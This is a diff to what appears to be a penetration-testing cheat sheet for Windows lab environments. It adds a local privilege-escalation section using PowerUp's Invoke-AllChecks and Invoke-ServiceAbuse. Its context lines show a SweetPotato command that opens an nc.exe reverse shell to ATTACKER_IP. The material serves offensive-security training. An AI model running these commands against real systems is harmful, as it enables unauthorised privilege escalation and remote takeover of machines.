@@ -53,6 +53,7 @@
   * <<cross-session, Cross-Session>>
   * <<Credential_Dumping, Credential Dumping>>
   * <<ToSystem, ToSystem>>
+  * <<local, Local PrivEsc>>
 - <<amsi, AMSI>>
 - <<post-exploatation, post-exploatation>>
 - <<av, AV evasion>>
@@ -1715,6 +1716,21 @@ Trigger system
 
 ```bash
 .\SweetPotato.exe -e 2 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\$USER\Documents\nc.exe ATTACKER_IP 4444 -e cmd.exe"
+```
+
+[[local]]
+== Local PrivEsc
+
+Use `PowerUp.ps1` , `winPEASany.exe`  to check local privilege escalation 
+
+```bash
+Invoke-AllChecks
+```
+
+Abuse service , output of `Invoke-AllChecks` will show it
+
+```bash
+Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student714
 ```
 
 [[amsi]]
